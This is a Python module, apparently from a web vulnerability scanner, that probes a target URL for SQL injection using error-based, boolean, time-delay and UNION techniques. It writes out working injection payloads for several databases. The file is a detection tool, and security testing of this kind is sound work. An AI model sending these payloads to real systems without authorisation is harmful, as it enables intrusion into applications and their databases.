"""
SQL Injection Vulnerability Scanner
Covers: Error-based, Boolean-based, Time-based, Union-based SQLi
Supports: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
"""
import time
import re
import urllib.parse
from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.core.http_client import get_client


@register_scanner
class SQLiDetector(BaseScanner):
    name = "SQL注入漏洞"
    description = "检测目标是否存在SQL注入漏洞，支持多种数据库类型和注入技术"
    category = "sqli"
    module = "sqli_detector"
    risk_level = "high"
    risk_score = 85
    cve_ids = []
    references = [
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://portswigger.net/web-security/sql-injection",
    ]
    fix_suggestion = "使用参数化查询或预编译语句，对用户输入进行严格过滤和转义，实施最小权限原则。"

    ERROR_PATTERNS = {
        "mysql": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"PSQLException",
            r"org\.postgresql\.util",
        ],
        "mssql": [
            r"Driver.*SQL[\-\s]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"System\.Data\.SqlClient",
        ],
        "oracle": [
            r"\bORA-[0-9]{5}\b",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLException",
            r"quoted string not properly terminated",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
        ],
        "generic": [
            r"SQL syntax.*",
            r"unclosed quotation mark",
            r"quoted string not properly terminated",
            r"unexpected end of SQL command",
            r"Incorrect syntax near",
            r"ODBC Driver",
            r"JDBC.*Driver",
            r"SQLException",
        ],
    }

    BOOLEAN_TRUE_PAYLOADS = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1' --", "' OR '1'='2' --"),
        ("') OR ('1'='1", "') OR ('1'='2"),
        ('" AND "1"="1', '" AND "1"="2'),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1", "1' AND '1'='2"),
    ]

    TIME_BASED_PAYLOADS = [
        ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ", 5),
        ("'; WAITFOR DELAY '0:0:5'--", 5),
        ("' OR SLEEP(5)-- ", 5),
        ('" OR SLEEP(5)-- ', 5),
        ("1' AND SLEEP(5)-- ", 5),
        ("' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('R',5)--", 5),
        ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", 5),
    ]

    UNION_PAYLOADS = [
        "' UNION SELECT NULL-- ",
        "' UNION SELECT NULL,NULL-- ",
        "' UNION SELECT NULL,NULL,NULL-- ",
        "' UNION SELECT NULL,NULL,NULL,NULL-- ",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ",
        "') UNION SELECT NULL-- ",
        "' UNION ALL SELECT NULL-- ",
        "' UNION SELECT @@version-- ",
    ]

    def __init__(self, target: str):
        super().__init__(target)
        self._client = get_client()
        self._db_type = None

    def _detect_db_type(self, error_text: str) -> str:
        for db_type, patterns in self.ERROR_PATTERNS.items():
            if db_type == "generic":
                continue
            for pattern in patterns:
                if re.search(pattern, error_text, re.IGNORECASE):
                    return db_type
        for pattern in self.ERROR_PATTERNS["generic"]:
            if re.search(pattern, error_text, re.IGNORECASE):
                return "unknown"
        return ""

    def _check_error_based(self, test_url: str) -> tuple:
        payloads = [
            "'",
            '"',
            "' OR '1'='1",
            "1'",
            "1%27",
            "%27",
            "')",
            "';",
        ]
        for payload in payloads:
            try:
                parsed = urllib.parse.urlparse(test_url)
                params = urllib.parse.parse_qs(parsed.query)
                if params:
                    for key in params:
                        injected = dict(params)
                        injected[key] = [payload]
                        new_query = urllib.parse.urlencode(injected, doseq=True)
                        injected_url = urllib.parse.urlunparse(
                            parsed._replace(query=new_query)
                        )
                        resp = self._client.get(injected_url, timeout=10)
                        if resp.status and resp.body:
                            text = resp.body.decode("utf-8", errors="replace")
                            db_type = self._detect_db_type(text)
                            if db_type:
                                return True, db_type, payload, text[:500]
                else:
                    injected_url = f"{test_url}{payload}"
                    resp = self._client.get(injected_url, timeout=10)
                    if resp.status and resp.body:
                        text = resp.body.decode("utf-8", errors="replace")
                        db_type = self._detect_db_type(text)
                        if db_type:
                            return True, db_type, payload, text[:500]
            except Exception:
                continue
        return False, "", "", ""

    def _check_boolean_based(self, test_url: str) -> tuple:
        for true_payload, false_payload in self.BOOLEAN_TRUE_PAYLOADS:
            try:
                parsed = urllib.parse.urlparse(test_url)
                params = urllib.parse.parse_qs(parsed.query)
                if params:
                    for key in params:
                        true_injected = dict(params)
                        true_injected[key] = [true_payload]
                        true_url = urllib.parse.urlunparse(
                            parsed._replace(query=urllib.parse.urlencode(true_injected, doseq=True))
                        )
                        false_injected = dict(params)
                        false_injected[key] = [false_payload]
                        false_url = urllib.parse.urlunparse(
                            parsed._replace(query=urllib.parse.urlencode(false_injected, doseq=True))
                        )
                        resp_true = self._client.get(true_url, timeout=10)
                        resp_false = self._client.get(false_url, timeout=10)
                        if resp_true.status and resp_false.status:
                            if resp_true.status != resp_false.status:
                                return True, "boolean", true_payload, f"Status: {resp_true.status} vs {resp_false.status}"
                            t_body = resp_true.body.decode("utf-8", errors="replace") if resp_true.body else ""
                            f_body = resp_false.body.decode("utf-8", errors="replace") if resp_false.body else ""
                            if len(t_body) != len(f_body) and abs(len(t_body) - len(f_body)) > 50:
                                return True, "boolean", true_payload, f"Length diff: {len(t_body)} vs {len(f_body)}"
            except Exception:
                continue
        return False, "", "", ""

    def _check_time_based(self, test_url: str) -> tuple:
        for payload, sleep_time in self.TIME_BASED_PAYLOADS:
            try:
                parsed = urllib.parse.urlparse(test_url)
                params = urllib.parse.parse_qs(parsed.query)
                if params:
                    for key in params:
                        injected = dict(params)
                        injected[key] = [payload]
                        injected_url = urllib.parse.urlunparse(
                            parsed._replace(query=urllib.parse.urlencode(injected, doseq=True))
                        )
                        start = time.time()
                        resp = self._client.get(injected_url, timeout=sleep_time + 5)
                        elapsed = time.time() - start
                        if elapsed >= sleep_time * 0.7:
                            return True, "time", payload, f"Response delay: {elapsed:.2f}s"
                else:
                    injected_url = f"{test_url}{payload}"
                    start = time.time()
                    resp = self._client.get(injected_url, timeout=sleep_time + 5)
                    elapsed = time.time() - start
                    if elapsed >= sleep_time * 0.7:
                        return True, "time", payload, f"Response delay: {elapsed:.2f}s"
            except Exception:
                continue
        return False, "", "", ""

    def _check_union_based(self, test_url: str) -> tuple:
        for payload in self.UNION_PAYLOADS:
            try:
                parsed = urllib.parse.urlparse(test_url)
                params = urllib.parse.parse_qs(parsed.query)
                if params:
                    for key in params:
                        injected = dict(params)
                        injected[key] = [payload]
                        injected_url = urllib.parse.urlunparse(
                            parsed._replace(query=urllib.parse.urlencode(injected, doseq=True))
                        )
                        resp = self._client.get(injected_url, timeout=10)
                        if resp.status and resp.body:
                            text = resp.body.decode("utf-8", errors="replace")
                            if "NULL" in text:
                                return True, "union", payload, text[:500]
            except Exception:
                continue
        return False, "", "", ""

    def check(self) -> bool:
        found_any = False

        error_found, db_type, error_payload, error_evidence = self._check_error_based(self.target)
        if error_found:
            found_any = True
            self.add_result(
                name=f"SQL注入漏洞 (报错注入) - {db_type}",
                target_url=self.target,
                description=f"检测到基于报错的SQL注入漏洞，数据库类型: {db_type}",
                detail=f"使用Payload: {error_payload}\n数据库类型: {db_type}",
                payload=error_payload,
                evidence=error_evidence,
            )

        bool_found, bool_type, bool_payload, bool_evidence = self._check_boolean_based(self.target)
        if bool_found:
            found_any = True
            self.add_result(
                name="SQL注入漏洞 (布尔盲注)",
                target_url=self.target,
                description="检测到基于布尔盲注的SQL注入漏洞",
                detail=f"使用Payload: {bool_payload}\n{bool_evidence}",
                payload=bool_payload,
                evidence=bool_evidence,
            )

        time_found, time_type, time_payload, time_evidence = self._check_time_based(self.target)
        if time_found:
            found_any = True
            self.add_result(
                name="SQL注入漏洞 (时间盲注)",
                target_url=self.target,
                description="检测到基于时间盲注的SQL注入漏洞",
                detail=f"使用Payload: {time_payload}\n{time_evidence}",
                payload=time_payload,
                evidence=time_evidence,
            )

        union_found, union_type, union_payload, union_evidence = self._check_union_based(self.target)
        if union_found:
            found_any = True
            self.add_result(
                name="SQL注入漏洞 (联合查询)",
                target_url=self.target,
                description="检测到基于联合查询的SQL注入漏洞",
                detail=f"使用Payload: {union_payload}",
                payload=union_payload,
                evidence=union_evidence,
            )

        return found_any
